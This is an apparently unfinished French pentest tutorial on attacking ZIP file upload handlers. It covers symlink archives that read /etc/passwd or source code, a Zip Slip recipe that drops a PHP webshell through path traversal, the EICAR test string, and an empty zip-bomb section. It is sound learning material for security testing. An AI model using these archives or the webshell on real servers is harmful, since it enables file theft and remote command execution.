# ZIP

**Facteur de risque** : Information Disclosure, RCE via LFI, DoS

**Extension** : .zip

**Type MIME** : application/zip

**Description** : Le **ZIP** est un format de fichier permettant l'archivage *(utilisation d'un seul fichier pour stocker plusieurs fichiers)* et la compression de données *(diminution de l'espace occupé sur le support numérique)* sans perte de qualité.
Si un fichier ZIP uploadé est **décompressé** ensuite par le serveur, plusieurs attaques peuvent être effectué:

## Sommaire

- Information Disclosure : Zip Symlink
- RCE via LFI : Décompression dans d'autres dossiers / Zip Slip
- DoS : Zip Bomb
- EICAR : Anti Malware Testfile

## Zip Symlink

Les archives peuvent contenir des liens symboliques. Un **lien symbolique** est un fichier spécial qui le lie à un autre fichier. En uploadant un ZIP contenant un lien symbolique qui sera décompressé par la suite, on peut accéder au fichier lié. Cette exploit permet donc de récupérer des **fichiers présents** sur le serveur.

### Pré-requis

- Le fichier ZIP doit être dézippé après avoir été uploadé.

- Pourvoir accéder à ces fichiers

### Attaque

1. Il faut créer d'abord le lien symbolique sur le fichier visé (ici /etc/passwd):

```shell
ln -s /etc/passwd passwd.txt
```

2. Puis d'archiver ce fichier (ajoutez *-r* pour archiver un dossier):

```shell
zip --symlinks passwd.zip passwd.txt
```

On peut ainsi récupérer le code source par exemple :

```shell
ln -s /var/www/html/index.php index.php
```

## LFI : Décompression dans d'autres dossiers / Zip Slip

Les cybercriminels peuvent créer des archives Zip pour lancer des attaques par traversée de chemin afin **d’écraser des fichiers** importants sur les systèmes affectés, soit en les détruisant, soit en les remplaçant par d’autres fichiers malveillants.

Cette méthode permet notamment de **d'échapper** au répertoires de téléchargement sécurisé, en remontant dans les répertoires non protégés pour pouvoir déposer un webshell par exemple.

### Pré-requis

- Le fichier Zip doit être dézippé après avoir été uploadé.

- Pourvoir accéder à ces fichiers

### Attaque

1. (Facultatif) Aller dans le répétoire /tmp :

```shell
cd /tmp
```

2. Récupérer un webshell (ici en PHP) :

```php
<?php echo "Shell";system($_GET['cmd']); ?>
```

3. Puis rentrer ce code :

```shell
for i in `seq 1 10`;do FILE=$FILE"xxA"; cp webshell.php $FILE"cmd.php";done
```

4. Puis compresser :

```shell
zip cmd.zip xx*.php
```

5. Utiliser un éditeur hexadécimal pour changer les xxA en ../

https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/

## Eicar : Anti Malware Testfile

Le fichier de test **Eicar** est une chaîne de caractères, destiné à tester le bon fonctionnement des logiciels antivirus. Tout logiciels antivirus qui prend en charge le fichier de test Eicar devrait le détecter :

```
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

**eicar_com.zip** contient le fichier de test Eicar. Un bon logiciel d'antivirus doit détecter un "virus", même à l'intérieur d'une archive.

**eicarcom2.zip** contient l'archive du fichier de test Eicar. Ce fichier peut être uploadé pour voir si le logiciel d'antivirus vérifie les archives à plus d'un niveau de profondeur.

## DoS : Zip Bomb

### Pré-requis

- Le fichier Zip doit être dézippé après avoir été uploadé.

## Reference

- ZIP :
  
  - [ZIP (format de fichier) — Wikipédia](https://fr.wikipedia.org/wiki/ZIP_(format_de_fichier))
  
  - https://book.hacktricks.xyz/pentesting-web/file-upload

- LFI : ZIP Symlink
  
  - [Challenges/Web - Serveur : File upload - ZIP [Root Me : plateforme d'apprentissage dédiée au Hacking et à la Sécurité de l'Information]](https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-ZIP)

- LFI : Décompression dans d'autres dossiers / ZIP Slip
  
  - [Compressed file upload and command execution &#8211; Silent Signal Techblog](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)
  
  - [GitHub - ptoomey3/evilarc: Create tar/zip archives that can exploit directory traversal vulnerabilities](https://github.com/ptoomey3/evilarc)
  
  - [GitHub - snyk/zip-slip-vulnerability: Zip Slip Vulnerability (Arbitrary file write through archive extraction)](https://github.com/snyk/zip-slip-vulnerability)

- Eicar : Anti Malware Testfile
  
  - [Anti Malware Testfile](https://www.eicar.org/?page_id=3950)

## Todo

- Pour les autresls archives.
- Ecrire un script pour pourvour décompresser dans d'autres dossiers
  [GitHub - ptoomey3/evilarc: Create tar/zip archives that can exploit directory traversal vulnerabilities](https://github.com/ptoomey3/evilarc)
- https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf
